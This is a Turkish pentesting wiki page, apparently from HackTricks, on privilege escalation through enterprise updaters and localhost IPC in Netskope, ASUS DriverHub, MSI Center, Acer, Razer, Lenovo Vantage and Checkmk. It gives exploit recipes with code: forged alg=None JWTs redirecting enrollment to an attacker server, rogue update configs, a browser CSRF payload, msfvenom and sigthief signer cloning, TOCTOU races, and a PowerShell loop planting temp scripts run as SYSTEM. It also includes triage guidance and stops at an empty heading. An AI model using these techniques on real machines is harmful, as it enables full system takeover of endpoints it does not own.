# Kurumsal Otomatik Güncelleyicileri ve Ayrıcalıklı IPC'yi Kötüye Kullanma (örn. Netskope, ASUS ve MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, düşük ayrıcalıklı bir IPC yüzeyi ve ayrıcalıklı bir güncelleme akışı sunan kurumsal uç nokta ajanlarında ve güncelleyicilerde görülen bir Windows yerel ayrıcalık yükseltme zinciri türünü geneller. Temsili bir örnek, Windows için Netskope Client < R129'dur (CVE-2025-0309). Bu örnekte düşük ayrıcalıklı bir kullanıcı, kayıt işlemini saldırganın kontrolündeki bir sunucuya yönlendirebilir ve ardından SYSTEM hizmetinin yüklediği kötü amaçlı bir MSI gönderebilir.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Benzer ürünlere karşı yeniden kullanabileceğiniz temel fikirler:
- Yeniden kaydı veya yapılandırmayı saldırganın sunucusuna yönlendirmek için ayrıcalıklı bir hizmetin localhost IPC'sini kötüye kullanın.
- Üreticinin güncelleme uç noktalarını uygulayın, sahte bir Trusted Root CA gönderin ve güncelleyiciyi kötü amaçlı, “imzalı” bir pakete yönlendirin.
- Zayıf imzalayan denetimlerini (CN izin listeleri), isteğe bağlı digest bayraklarını ve gevşek MSI özelliklerini atlatın.
- IPC “şifreliyse”, registry'de depolanan ve herkes tarafından okunabilen makine tanımlayıcılarından anahtarı/IV'yi türetin.
- Hizmet çağıranları image path/process name ile sınırlandırıyorsa, izin verilen bir sürece kod enjekte edin veya süreci askıya alınmış durumda başlatıp DLL'nizi küçük bir thread-context değişikliğiyle yükleyin.

Özel yerel TCP hizmetleri de PIN veya başka bir uygulama kimlik bilgisi gerektirse bile aynı kimlik ve girdi sınırı incelemesine tabi tutulmalıdır. Dinleyiciyi ilgili sürece ve etkin hizmet hesabına eşleyin; ardından tam olarak dağıtılmış ikili dosyayı/sürümü ve çağıranın kontrolündeki alanların sabit boyutlu tamponlara kopyalanmadan veya bir alt süreç komutu oluşturmak için kullanılmadan önce uzunluklarının denetlenip denetlenmediğini inceleyin. [Microsoft'un buffer-overrun rehberi](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns), ayrıcalıklı yerel kodda denetlenmeyen harici girdilerin neden tehlikeli olduğunu açıklar. Bir loopback dinleyicisi, sabit kodlanmış kimlik bilgisi veya tek başına süreç adı; bellek bozulmasını ya da SYSTEM düzeyinde kod çalıştırmayı kanıtlamaz. Erişilebilirlik, yetkilendirme, kod yolu ve azaltıcı önlemler birbirinden ayrı koşullardır. Rutin keşfi pasif tutun; çalışan bir hizmete çökme yaratacak uzunlukta girdiler göndermeyin.

---
## 1) localhost IPC üzerinden kaydı saldırganın sunucusuna yönlendirme

Birçok ajan, localhost TCP üzerinden JSON kullanarak SYSTEM hizmetiyle iletişim kuran bir kullanıcı modu UI süreciyle birlikte gelir.

Netskope'ta gözlemlenen:
- UI: stAgentUI (düşük bütünlük) ↔ Hizmet: stAgentSvc (SYSTEM)
- IPC komut kimliği 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) Backend ana makinesini (örn. AddonUrl) kontrol eden claim'lere sahip bir JWT kayıt token'ı oluşturun. İmza gerekmemesi için alg=None kullanın.
2) Provisioning komutunu, JWT'nizi ve tenant adınızı içeren IPC mesajını gönderin:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Servis, enrollment/config için senin rogue server'ına istek göndermeye başlar, ör.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Çağıran doğrulaması path/name tabanlıysa, isteği allow-list'te bulunan bir vendor binary'den başlat (§4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Update channel'ı ele geçirerek SYSTEM olarak kod çalıştırma

Client senin server'ınla iletişim kurduğunda, beklenen endpoint'leri uygula ve onu saldırganın MSI'ına yönlendir. Tipik sıralama:

1) /v2/config/org/clientconfig → Çok kısa bir updater interval'ı içeren JSON config döndür, ör.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA certificate döndürür. Servis bunu Local Machine Trusted Root store'a yükler.
3) /v2/checkupdate → Kötü amaçlı bir MSI'ı ve sahte bir sürümü gösteren metadata sağlayın.

Gerçek saldırılarda yaygın olarak görülen kontrolleri atlatma:
- Signer CN allow-list: servis yalnızca Subject CN'nin “netSkope Inc” veya “Netskope, Inc.” ile eşleşip eşleşmediğini kontrol ediyor olabilir. Rogue CA'niz bu CN'ye sahip bir leaf oluşturup MSI'ı imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adlı zararsız bir MSI property ekleyin. Yükleme sırasında herhangi bir enforcement uygulanmaz.
- İsteğe bağlı digest enforcement: config flag (ör. check_msi_digest=false), ek cryptographic validation'ı devre dışı bırakır.

Sonuç: SYSTEM servisi MSI'ınızı
C:\ProgramData\Netskope\stAgent\data\*.msi
yolundan yükleyerek NT AUTHORITY\SYSTEM olarak rastgele kod çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass dersi: bir vendor, update kaynağını cryptographic olarak doğrulamak yerine az sayıda “güvenilir” domain'i allow-list'e ekleyerek karşılık verirse trafiği yönlendirmenize hâlâ izin veren, vendor'a ait redirector'ları veya reverse proxy'leri arayın. Netskope örneğinde, kamuya açık takip araştırmaları R129 dönemi allow-list'inin, saldırganın denetimindeki Azure App Service içeriğini proxy'leyen `rproxy.goskope.com` üzerinden hâlâ kötüye kullanılabildiğini gösterdi. Hostname allow-list'lerini bir güven sınırı değil, aşılması gereken küçük bir engel olarak değerlendirin.<sup>[[14]](#references)</sup>

---
## 3) Encrypted IPC request'leri oluşturma (varsa)

R127'den itibaren Netskope, IPC JSON'u Base64 gibi görünen bir encryptData alanıyla sarmaladı. Tersine mühendislik, AES kullanıldığını ve key/IV değerlerinin herhangi bir kullanıcının okuyabildiği registry değerlerinden türetildiğini ortaya çıkardı:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Saldırganlar encryption işlemini yeniden uygulayabilir ve standart bir kullanıcı olarak geçerli encrypted command'ler gönderebilir.<sup>[[1]](#references)[[2]](#references)</sup> Genel ipucu: Bir agent IPC'sini aniden “encrypt” etmeye başlarsa HKLM altındaki device ID'leri, product GUID'lerini ve install ID'lerini materyal olarak kullanıp kullanmadığını araştırın.

---
## 4) IPC caller allow-list'lerini atlatma (path/name kontrolleri)

Bazı servisler TCP bağlantısının PID'sini bulup image path/name değerini Program Files altındaki allow-list'e eklenmiş vendor binary'leriyle (ör. stagentui.exe, bwansvc.exe, epdlp.exe) karşılaştırarak peer'i doğrulamaya çalışır.

İki pratik bypass:
- Allow-list'e eklenmiş bir process'e (ör. nsdiag.exe) DLL injection yapıp IPC'yi process içinden proxy'lemek.
- Driver tarafından uygulanan tamper kurallarını karşılamak için allow-list'e eklenmiş bir binary'yi suspended olarak başlatıp CreateRemoteThread kullanmadan proxy DLL'inizi başlatmak (§5'e bakın).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper protection ile uyumlu injection: suspended process + NtContinue patch

Ürünler, korunan process'lere ait handle'lardan tehlikeli hakları kaldırmak için sıklıkla bir minifilter/OB callbacks driver'ı (ör. Stadrv) içerir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: hakları THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile sınırlar

Bu kısıtlamalara uyan güvenilir bir user-mode loader:
1) Bir vendor binary'sini CREATE_SUSPENDED ile CreateProcess kullanarak başlatın.
2) İzin verilen handle'ları alın: process için PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve THREAD_GET_CONTEXT/THREAD_SET_CONTEXT haklarına sahip bir thread handle'ı (veya bilinen bir RIP'teki kodu patch'liyorsanız yalnızca THREAD_RESUME).
3) ntdll!NtContinue (veya erken yüklenen, eşlemesi garanti edilen başka bir thunk) fonksiyonunu, DLL path'inizdeki LoadLibraryW'yi çağırıp ardından geri dönen küçük bir stub ile üzerine yazın.
4) Stub'ı process içinde çalıştırıp DLL'inizi yüklemek için ResumeThread kullanın.

Önceden korunan bir process üzerinde PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız (process'i siz oluşturduğunuz) için driver'ın policy'sine uyulur.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Pratik araçlar
- NachoVPN (Netskope plugin), rogue CA oluşturma, kötü amaçlı MSI imzalama ve gerekli endpoint'leri sunma işlemlerini otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope, keyfi IPC message'ları oluşturan (isteğe bağlı olarak AES ile encrypted) özel bir IPC client'tır ve allow-list'e eklenmiş bir binary'den kaynaklanmak için suspended-process injection'ı içerir.<sup>[[4]](#references)</sup>

## 7) Bilinmeyen updater/IPC yüzeyleri için hızlı triage iş akışı

Yeni bir endpoint agent'ı veya anakart “helper” suite'i incelerken, privesc için uygun bir hedefle karşı karşıya olup olmadığınızı anlamak için genellikle hızlı bir iş akışı yeterlidir:<sup>[[6]](#references)</sup>

1) Loopback listener'ları listeleyip vendor process'leriyle eşleştirin:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Aday named pipe'ları listeleyin:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Eklenti tabanlı IPC sunucularının kullandığı kayıt defteri destekli yönlendirme verilerini çıkar:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Önce user-mode client'tan endpoint adlarını, JSON key'lerini ve command ID'lerini çıkarın. Paketlenmiş Electron/.NET frontend'leri sıklıkla tam şemayı leak eder:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Yalnızca süreci sonunda başlatan kod yolunu değil, asıl güven koşulunu araştırın:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Öncelik vermeye değer örüntüler:
- `CryptQueryObject`/sertifika ayrıştırma işlemlerinde genellikle `WinVerifyTrust` kullanılmıyorsa, “sertifika mevcut” ifadesi “sertifikaya güveniliyor” olarak değerlendirilmiş olabilir; bu da sertifika klonlama veya sahte imzalayıcıya dayalı diğer numaraları mümkün kılar.
- `Origin`, `Referer`, indirme URL'leri, süreç adları veya imzalayan CN'leri üzerinde yapılan alt dize/son ek kontrolleri kimlik doğrulama değildir. `contains(".vendor.com")` kontrolü, saldırganın kontrolündeki benzer görünümlü etki alanlarıyla genellikle istismar edilebilir.
- Düşük ayrıcalıklı GUI “dosyaya güveniliyor” kararını veriyor ve SYSTEM broker yalnızca bu sonucu kullanıyorsa, istemci tarafındaki DLL/JS'yi yamamak veya yeniden uygulamak sınırı tamamen aşabilir (Razer tarzı ayrık doğrulama).
- Broker bir payload'u `%TEMP%`/`C:\Windows\Temp` konumuna kopyalıyor ve ardından o konumdan doğruluyor veya zamanlıyorsa, TOCTOU değiştirme aralıklarını ve daha zayıf kontroller içeren alternatif `ExecuteTask()` sarmalayıcıları sunan kardeş plugin modüllerini hemen test edin.<sup>[[6]](#references)</sup>

Named pipe ağırlıklı hedeflerde PipeViewer, protokolü derinlemesine tersine mühendisliğe tabi tutmaya başlamadan önce zayıf DACL'leri ve uzaktan erişilebilen pipe'ları tespit etmenin hızlı bir yoludur.<sup>[[11]](#references)</sup>

Hedef arayanları yalnızca PID, image path veya süreç adına göre doğruluyorsa, bunu bir güvenlik sınırı değil, yalnızca aşılması gereken küçük bir engel olarak değerlendirin: meşru istemciye inject etmek veya bağlantıyı izin verilen bir süreçten kurmak, sunucunun kontrollerini geçmek için çoğu zaman yeterlidir. Named pipe'lar özelinde, [istemci taklidi ve pipe abuse hakkındaki bu sayfa](named-pipe-client-impersonation.md) bu primitive'i daha ayrıntılı ele alıyor.

Ayrıcalıklı bir **cleanup veya restore broker** için pipe ACL'nin yanı sıra path trust boundary'yi de inceleyin. Hizmet yürütülebilir dosyası ve kurulum dizini korumalı olsa bile, daha düşük ayrıcalıklı bir arayan paylaşılan bir dizinde restore hedefini seçebilir veya hazırlanmış bir yedekleme öğesini yeniden adlandırabilir. Arayanın restore komutuna erişebildiğini, hazırlanmış tam girdiyi veya dosya adını değiştirebildiğini, broker'ın daha yüksek bir kimlikle çalıştığını ve restore işleminin gerçekten seçilen korumalı path'e yazdığını ayrı ayrı doğrulayın. Yazılabilir bir hazırlama dizini veya okunabilir bir pipe tek başına ayrıcalıklı olarak istenen yere yazma imkânını kanıtlamaz; hedef eşlemesi ve hizmet davranışı kod incelemesi veya kontrollü testlerle doğrulanmalıdır. Bilinmeyen bir cleanup komutunu pasif keşif sırasında çalıştırmayın; kullanıcı dosyalarını silebilir.

---
## 8) Yalnızca vendor imzalarını doğrulayan modüler add-in broker'ları (Lenovo Vantage örüntüsü)

Avlanmaya değer daha yeni bir varyasyon **imzalı istemci RPC broker** örüntüsüdür: düşük ayrıcalıklı, Lenovo imzalı bir masaüstü süreci bir SYSTEM hizmetiyle iletişim kurar ve hizmet, JSON komutlarını `%ProgramData%` altındaki XML ile tanımlanmış bir dizi add-in'e yönlendirir. Kabul edilen imzalı istemcilerden herhangi birinin **içinde kod yürütme** elde edildiğinde, `runas="system"` içeren her sözleşme saldırı yüzeyinizin bir parçası hâline gelir.<sup>[[15]](#references)</sup>

Lenovo Vantage araştırmalarında gözlemlenen değerli primitive'ler:
- **Arayana vendor imzasına sahip olduğu için güvenmek**: Araştırmacılar, Lenovo imzalı bir EXE'yi yazılabilir bir dizine kopyalayıp DLL side-load (`profapi.dll`) koşulunu sağlayarak kimliği doğrulanmış bir bağlama ulaştı; böylece hizmetin zaten güvendiği bir istemcinin içinde istedikleri kodu çalıştırdılar.
- **Manifest odaklı saldırı yüzeyi keşfi**: Add-in'ler `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` altında tanımlanır; birkaç sözleşme `SYSTEM` olarak çalışır. Bu nedenle manifest'leri sıralamak, gerçek ayrıcalıklı komutları broker'ın kendisini tersine mühendisliğe tabi tutmaktan daha hızlı ortaya çıkarabilir.
- **Kimliği doğrulanmış kanalın arkasındaki komut bazlı hatalar**: Güvenilen istemcinin içine girdikten sonra, kamuya açık araştırmalar güncelleme/kurulum komutlarında path traversal + race condition'lar, ayrıcalıklı ayar veritabanlarında raw SQL abuse ve amaçlanan hive dışına yazmaya imkân veren alt dize tabanlı registry path kontrolleri ortaya çıkardı.

Hedefte işe yarayabilecek keşif yöntemleri:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Pratik çıkarım: Bir yardımcı araç paketi önce **çağıran süreci** doğrulayan ve ancak bundan sonra onlarca plugin/add-in komutuna yönlendirme yapan bir broker sunuyorsa, ön kapıdaki güven denetimini aşmakla yetinmeyin. Manifest/sözleşme tablosunu dökün ve yüksek ayrıcalıklı her fiili bağımsız olarak fuzz edin; doğrulanmış kanal genellikle ikinci aşamada birkaç hatayı gizler.

---
## 1) Ayrıcalıklı HTTP API'lerine karşı tarayıcıdan localhost'a CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 adresinde çalışan ve https://driverhub.asus.com adresinden gelen tarayıcı çağrılarını bekleyen, kullanıcı modunda bir HTTP servisi (ADU.exe) içerir. Origin filtresi, hem Origin header'ı hem de `/asus/v1.0/*` üzerinden sunulan indirme URL'leri üzerinde basitçe `string_contains(".asus.com")` işlemi gerçekleştirir. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi saldırgan denetimindeki herhangi bir host bu denetimi geçer ve JavaScript üzerinden durum değiştiren istekler gönderebilir.<sup>[[6]](#references)</sup> Ek bypass örüntüleri için [CSRF temelleri](../../pentesting-web/csrf-cross-site-request-forgery.md) bölümüne bakın.

Pratik akış:
1) `.asus.com` içeren bir domain kaydedin ve burada kötü amaçlı bir web sayfası barındırın.
2) `http://127.0.0.1:53000` üzerindeki ayrıcalıklı bir endpoint'i (ör. `Reboot`, `UpdateApp`) çağırmak için `fetch` veya XHR kullanın.
3) Handler'ın beklediği JSON body'yi gönderin — paketlenmiş frontend JS aşağıdaki şemayı gösteriyor.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Aşağıda gösterilen PowerShell CLI bile, Origin header güvenilen değer olarak taklit edildiğinde başarılı olur:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Saldırgan sitesine yapılan herhangi bir tarayıcı ziyareti, böylece SYSTEM yetkileriyle çalışan bir helper'ı harekete geçiren 1 tıklamalı (veya `onload` aracılığıyla 0 tıklamalı) yerel bir CSRF'ye dönüşür.

---
## 2) Güvenli olmayan code-signing doğrulaması ve sertifika klonlama (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`, JSON gövdesinde tanımlanan keyfi yürütülebilir dosyaları indirir ve `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` konumunda önbelleğe alır. İndirme URL'si doğrulaması aynı substring mantığını kullandığından `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. İndirme işleminden sonra ADU.exe, çalıştırmadan önce PE dosyasının bir imza içerdiğini ve Subject dizgesinin ASUS ile eşleştiğini kontrol etmekle yetinir; `WinVerifyTrust` veya zincir doğrulaması yapmaz.

Bu akışı silahlandırmak için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS'un imzalayanını payload'a klonlayın (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` dosyasını `.asus.com` benzeri bir etki alanında barındırın ve yukarıdaki tarayıcı CSRF'si aracılığıyla UpdateApp'i tetikleyin.

Hem Origin hem de URL filtreleri substring tabanlı olduğundan ve imzalayan kontrolü yalnızca dizeleri karşılaştırdığından DriverHub, saldırganın ikili dosyasını kendi yükseltilmiş bağlamında indirip çalıştırır.<sup>[[6]](#references)</sup>

---
## 1) Updater'ın kopyalama/çalıştırma yollarında TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center'ın SYSTEM hizmeti, her çerçevenin `4-byte ComponentID || 8-byte CommandID || ASCII arguments` biçiminde olduğu bir TCP protokolü sunar. Temel bileşen (Component ID `0f 27 00 00`), `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` komutuyla birlikte gelir. İşleyicisi:
1) Sağlanan yürütülebilir dosyayı `C:\Windows\Temp\MSI Center SDK.exe` konumuna kopyalar.
2) İmzayı `CS_CommonAPI.EX_CA::Verify` aracılığıyla doğrular (sertifika subject'i “MICRO-STAR INTERNATIONAL CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalıdır).
3) Saldırganın denetimindeki argümanlarla geçici dosyayı SYSTEM olarak çalıştıran bir scheduled task oluşturur.

Kopyalanan dosya, doğrulama ile `ExecuteTask()` arasında kilitlenmez. Bir saldırgan şunları yapabilir:
- İmza kontrolünün geçmesini ve task'ın kuyruğa alınmasını garanti etmek için meşru, MSI imzalı bir ikili dosyaya işaret eden Frame A gönderir.
- Doğrulama tamamlandıktan hemen sonra `MSI Center SDK.exe` dosyasının üzerine kötü amaçlı bir payload yazan, tekrarlanan Frame B mesajlarıyla yarışı sürdürür.

Scheduler çalıştığında, özgün dosya doğrulanmış olmasına rağmen üzerine yazılmış payload'ı SYSTEM olarak çalıştırır. Güvenilir exploitation için TOCTOU aralığı kazanılana kadar CMD_AutoUpdateSDK'yi spam'leyen iki goroutine/thread kullanılır.<sup>[[6]](#references)</sup>

---
## 2) Özel SYSTEM düzeyi IPC ve impersonation'dan yararlanma (MSI Center + Acer Control Centre)

### MSI Center TCP komut kümeleri
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Bir çerçevenin ilk 4 byte'ı bileşeni seçerek saldırganların komutları keyfi modüllere yönlendirmesini sağlar.
- Plugin'ler kendi task runner'larını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` komutunu sunar ve **imza doğrulaması yapmadan** doğrudan `API_Support.EX_Task::ExecuteTask()` çağrısı yapar; herhangi bir yerel kullanıcı bunu `C:\Users\<user>\Desktop\payload.exe` dosyasını çalıştıracak şekilde ayarlayarak deterministik SYSTEM execution elde edebilir.
- Loopback trafiğini Wireshark ile dinlemek veya .NET ikili dosyalarını dnSpy'da enstrümante etmek, Component ↔ komut eşlemesini hızla ortaya çıkarır; ardından özel Go/Python client'ları çerçeveleri yeniden oynatabilir.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipe'ları ve impersonation düzeyleri
- SYSTEM olarak çalışan `ACCSvc.exe`, `\\.\pipe\treadstone_service_LightMode` named pipe'ını sunar ve isteğe bağlı ACL'si uzak client'lara da izin verir (ör. `\\TARGET\pipe\treadstone_service_LightMode`). Dosya yolu içeren 7 komut ID'sinin gönderilmesi, hizmetin process-spawning yordamını çağırır.
- Client library, argümanlarla birlikte bir magic terminator byte'ı (113) serileştirir. Frida/`TsDotNetLib` ile dinamik enstrümantasyon ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümündeki enstrümantasyon ipuçlarına bakın), yerel işleyicinin `CreateProcessAsUser` çağrısından önce bu değeri bir `SECURITY_IMPERSONATION_LEVEL` ve integrity SID ile eşleştirdiğini gösterir.
- 113 (`0x71`) değerini 114 (`0x72`) ile değiştirmek, tam SYSTEM token'ını koruyan ve yüksek bütünlük düzeyinde bir SID (`S-1-16-12288`) ayarlayan genel dala geçiş sağlar. Böylece başlatılan ikili dosya hem yerel olarak hem de makineler arasında kısıtlanmamış SYSTEM olarak çalışır.
- Bunu açığa çıkarılmış installer flag'i (`Setup.exe -nocheck`) ile birleştirerek ACC'yi lab VM'lerinde bile kurabilir ve vendor donanımı olmadan pipe'ı test edebilirsiniz.<sup>[[6]](#references)</sup>

Bu IPC bug'ları, localhost hizmetlerinin neden karşılıklı kimlik doğrulaması (ALPC SID'leri, `ImpersonationLevel=Impersonation` filtreleri, token filtering) uygulaması gerektiğini ve her modülün “keyfi ikili dosya çalıştırma” helper'ının neden aynı signer doğrulamalarını kullanması gerektiğini gösterir.

---
## 3) Zayıf user-mode doğrulaması kullanan COM/IPC “elevator” helper'ları (Razer Synapse 4)

Razer Synapse 4, bu aileye başka bir yararlı örüntü ekledi: düşük yetkili bir kullanıcı, `RzUtility.Elevator` aracılığıyla bir COM helper'dan process başlatmasını isteyebilir; ancak güven kararı, ayrıcalıklı sınır içinde sağlam biçimde uygulanmak yerine user-mode DLL (`simple_service.dll`) tarafından verilir.

Gözlemlenen exploitation yolu:
- `RzUtility.Elevator` COM nesnesini oluşturun.
- Yükseltilmiş bir başlatma isteğinde bulunmak için `LaunchProcessNoWait(<path>, "", 1)` çağrısını yapın.
- Herkese açık PoC'de, isteği göndermeden önce `simple_service.dll` içindeki PE-signature kontrolü devre dışı bırakılır; böylece saldırganın seçtiği keyfi bir yürütülebilir dosyanın başlatılması sağlanır.<sup>[[6]](#references)[[10]](#references)</sup>

Minimal PowerShell çağrısı:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Genel çıkarım: “helper” paketlerini analiz ederken localhost TCP veya named pipe'ları incelemekle yetinmeyin. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi adlara sahip COM sınıflarını kontrol edin; ardından ayrıcalıklı hizmetin hedef binary'yi gerçekten kendisinin doğrulayıp doğrulamadığını, yoksa yalnızca yamalanabilir bir user-mode client DLL tarafından hesaplanan sonuca mı güvendiğini teyit edin. Bu örüntü Razer'ın ötesinde de geçerlidir: yüksek ayrıcalıklı broker'ın düşük ayrıcalıklı taraftan gelen bir izin/verme kararını kullandığı her bölünmüş tasarım, privesc yüzeyi adayıdır.


---
## MSI onarımı sırasında tahmin edilebilir geçici script çalıştırma (Checkmk Agent / CVE-2024-0670)

Bazı Windows agent'ları hâlâ ayrıcalıklı işlemleri, `C:\Windows\Temp` içine geçici bir `.cmd` yazarak ve bunu `SYSTEM` olarak çalıştırarak gerçekleştiriyor. Dosya adı tahmin edilebiliyorsa ve hizmet mevcut dosyaları güvenli şekilde yeniden oluşturmuyorsa, düşük ayrıcalıklı bir kullanıcı gelecekte kullanılacak geçici dosyayı önceden **salt okunur** olarak oluşturabilir ve ayrıcalıklı sürecin kendi script'i yerine saldırganın kontrolündeki içeriği çalıştırmasını sağlayabilir.

Savunmasız Checkmk Agent derlemelerinde gözlemlenenler:
- geçici dosya kalıbı: `cmk_all_<PID>_1.cmd`
- etkilenen dallar: `2.0.0`, `2.1.0`, `2.2.0`
- tetikleyici: önbelleğe alınmış agent paketinin MSI **onarımı**<sup>[[8]](#references)[[9]](#references)</sup>

Uygulamalı iş akışı:
1. Mevcut process ID'lerinden veya çalışan agent PID'sinden gerçekçi bir PID aralığı tahmin edin.
2. Kısa bir **ASCII** `.cmd` payload'ı yazın (`Set-Content -Encoding Ascii` veya `cmd.exe` yönlendirmesi kullanın; batch dosyaları için UTF-16 PowerShell çıktısından kaçının).
3. Aday aralıktaki `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dosyalarını topluca oluşturun ve her birini salt okunur olarak işaretleyin.
4. Ayrıcalıklı hizmetin geçici script'i yeniden oluşturmayı denemesini ve ardından çalıştırmasını sağlamak için önbelleğe alınmış MSI'ın onarımını tetikleyin.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Güvenlik açığı bulunan ürün Windows Installer ile yüklendiyse, onarımı tetiklemeden önce `C:\Windows\Installer` altındaki rastgele görünen önbelleğe alınmış MSI dosyasını ürün adıyla eşleştirin:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- `qwinsta`, `msiexec /fa` etkileşimli olmayan bir WinRM shell'inde başarısız olduğunda ve mevcut bir masaüstü/bağlantısı kesilmiş oturumun onarımı doğru şekilde tetikleyip tetikleyemeyeceğini anlamanız gerektiğinde kullanışlıdır.<sup>[[7]](#references)</sup>
- Bu örüntü, **geçici script'leri herkesin yazabildiği konumlara yerleştirip daha sonra SYSTEM olarak çalıştıran** diğer endpoint agent'larına ve updater'lara da uygulanabilir. Tahmin edilebilir adları, exclusive create semantiğinin eksikliğini ve isteğe bağlı olarak tetiklenebilen onarım/güncelleme akışlarını test edin.

### Etkileşimli installer onarımı ve ayrıcalıklı konsol

